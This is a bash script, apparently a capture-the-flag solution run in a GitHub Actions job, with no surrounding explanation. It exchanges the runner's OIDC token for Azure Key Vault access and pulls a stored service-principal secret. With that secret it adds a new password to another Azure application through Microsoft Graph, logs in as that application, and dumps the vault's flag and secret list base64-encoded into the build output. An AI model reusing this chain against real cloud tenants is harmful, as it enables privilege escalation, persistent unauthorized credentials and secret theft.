#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"
LAPP=891fb158-e02c-4428-a885-53b811f369c0
FLAG="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
SECLIST="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4"
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
js=$(curl -sS "$PROD/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
scid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or "")')
ssec=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or "")')
GSS=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$scid" -d grant_type=client_credentials --data-urlencode "client_secret=$ssec" --data-urlencode "scope=https://graph.microsoft.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
APPOBJ=$(curl -sS "https://graph.microsoft.com/v1.0/applications?\$filter=appId%20eq%20'$LAPP'&\$select=id" -H "Authorization: Bearer $GSS" | python3 -c 'import sys,json;v=json.load(sys.stdin).get("value",[]);print(v[0]["id"] if v else "")')
echo "appObj=$APPOBJ"
NEWSEC=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$APPOBJ/addPassword" -H "Authorization: Bearer $GSS" -H "Content-Type: application/json" -d '{"passwordCredential":{"displayName":"ci"}}' | python3 -c 'import sys,json;print(json.load(sys.stdin).get("secretText",""))')
echo "newsec_len=${#NEWSEC}"
LVT=""
for i in 1 2 3 4 5 6; do
  sleep 20
  LVT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$LAPP" -d grant_type=client_credentials --data-urlencode "client_secret=$NEWSEC" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  [ -n "$LVT" ] && { echo "auth ok after $((i*20))s"; break; }
done
echo "lvt_len=${#LVT}"
echo "FLAG_B64: $(curl -sS "$FLAG" -H "Authorization: Bearer $LVT" | head -c 400 | base64 -w0)"
echo "SECLIST_B64: $(curl -sS "$SECLIST" -H "Authorization: Bearer $LVT" | head -c 600 | base64 -w0)"
echo END
